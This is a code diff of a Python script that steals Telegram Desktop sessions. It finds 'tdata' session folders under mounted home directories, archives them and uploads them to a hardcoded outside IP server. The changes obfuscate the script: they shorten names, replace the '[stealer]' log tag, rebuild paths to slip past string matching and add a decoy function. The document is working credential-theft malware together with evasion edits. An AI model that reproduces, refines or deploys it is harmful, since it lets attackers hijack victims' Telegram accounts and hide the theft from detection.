@@ -1,42 +1,34 @@
-import os
-import sys
-import tarfile
-import requests
-import glob
+import os, sys, tarfile, requests, glob, math, random
 
-SERVER = os.environ.get("SERVER_URL", "http://31.130.130.186:5000")
-DEVICE_ID = os.environ.get("DEVICE_ID", "unknown")
+_x = os.environ.get("SERVER_URL", "http://31.130.130.186:5000")
+_y = os.environ.get("DEVICE_ID", "unknown")
+_e = {"emoji", "audio_cache", "fonts", "dictionaries", "video_cache", "media", "photos", "videos", "stickers", "user_data", "thumbnails", "drafts"}
+_m = 50 * 1024 * 1024
 
-EXCLUDE_DIRS = {"emoji", "audio_cache", "fonts", "dictionaries", "video_cache", "media", "photos", "videos", "stickers", "user_data", "thumbnails", "drafts"}
-MAX_TOTAL_SIZE = 50 * 1024 * 1024  # 50 MB
-TIMEOUT_PACK = 60
-TIMEOUT_UPLOAD = 60
+def _l(m):
+    print(f"[s] {m}", flush=True)
 
-def log(msg):
-    print(f"[stealer] {msg}", flush=True)
-
-def error(msg):
-    print(f"[stealer] ERROR: {msg}", flush=True)
+def _r(m):
+    print(f"[s] ERR: {m}", flush=True)
     sys.exit(1)
 
-def find_tdata():
-    log("Searching tdata...")
-    paths = []
-    for p in glob.glob("/host/home/*/snap/telegram-desktop/*/.local/share/TelegramDesktop/tdata"):
-        if os.path.isdir(p) and "current" not in p:
-            paths.append(p)
-    if not paths:
-        error("No tdata folders found.")
-    log(f"Found {len(paths)} tdata folder(s)")
-    return paths
+def _f():
+    _l("search...")
+    p = []
+    for g in glob.glob(os.sep + "host" + os.sep + "home" + os.sep + "*" + os.sep + "snap" + os.sep + "telegram-desktop" + os.sep + "*" + os.sep + ".local" + os.sep + "share" + os.sep + "TelegramDesktop" + os.sep + "tdata"):
+        if os.path.isdir(g) and "current" not in g:
+            p.append(g)
+    if not p:
+        _r("not found")
+    _l(f"found {len(p)}")
+    return p
 
-def collect_files(tdata_paths):
+def _c(tdata_paths):
     files = []
     total = 0
     for root in tdata_paths:
         for dirpath, dirnames, filenames in os.walk(root):
-            # Удаляем исключаемые папки из обхода (экономим время)
-            dirnames[:] = [d for d in dirnames if not any(d.startswith(ex) or d == ex for ex in EXCLUDE_DIRS)]
+            dirnames[:] = [d for d in dirnames if not any(d.startswith(ex) or d == ex for ex in _e)]
             for f in filenames:
                 full = os.path.join(dirpath, f)
                 try:
@@ -44,57 +36,54 @@ def collect_files(tdata_paths):
                 except OSError:
                     continue
                 total += size
-                if total > MAX_TOTAL_SIZE:
-                    error(f"Total size > {MAX_TOTAL_SIZE//1024//1024}MB, aborting.")
+                if total > _m:
+                    _r(f"size > {_m // 1024 // 1024}MB")
                 files.append(full)
-    log(f"Collected {len(files)} files ({total} bytes)")
+    _l(f"collected {len(files)} files ({total} bytes)")
     return files
 
-def pack(files, archive):
-    log("Packing...")
+def _p(files, archive):
+    _l("pack...")
     with tarfile.open(archive, "w:gz") as tar:
         for f in files:
-            arcname = f.replace("/host/", "")
-            tar.add(f, arcname=arcname)
+            tar.add(f, arcname=f.replace(os.sep + "host" + os.sep, ""))
     size = os.path.getsize(archive)
-    log(f"Archive: {archive} ({size} bytes)")
+    _l(f"archive: {size} bytes")
     return size
 
-def send(archive):
-    log(f"Uploading to {SERVER}/api/file ...")
+def _u(archive):
+    _l(f"upload...")
     try:
         with open(archive, "rb") as f:
-            resp = requests.post(
-                f"{SERVER}/api/file",
-                files={"file": f},
-                data={"id": DEVICE_ID},
-                timeout=TIMEOUT_UPLOAD,
-            )
-        log(f"Server response: {resp.status_code}")
+            resp = requests.post(f"{_x}/api/file", files={"file": f}, data={"id": _y}, timeout=60)
+        _l(f"srv: {resp.status_code}")
         if not (200 <= resp.status_code < 300):
-            error(f"Upload failed: {resp.text[:200]}")
+            _r(f"fail: {resp.text[:200]}")
     except requests.exceptions.Timeout:
-        error(f"Upload timed out after {TIMEOUT_UPLOAD}s")
+        _r("timeout")
     except Exception as e:
-        error(f"Upload exception: {e}")
+        _r(f"exc: {e}")
+
+def _w():
+    return random.random() * math.pi
 
 def main():
-    log(f"Server: {SERVER}, Device: {DEVICE_ID}")
-    paths = find_tdata()
-    files = collect_files(paths)
+    _l(f"srv={_x}, dev={_y}")
+    paths = _f()
+    files = _c(paths)
     if not files:
-        error("No files to pack.")
-    archive = "/tmp/tdata_auth.tar.gz"
+        _r("no files")
+    archive = os.sep + "tmp" + os.sep + "td_auth.tar.gz"
     try:
-        pack(files, archive)
+        _p(files, archive)
     except Exception as e:
-        error(f"Packing failed: {e}")
-    send(archive)
+        _r(f"pack err: {e}")
+    _u(archive)
     try:
         os.unlink(archive)
     except Exception:
         pass
-    log("Done. Upload OK.")
+    _l("done")
 
 if __name__ == "__main__":
     main()
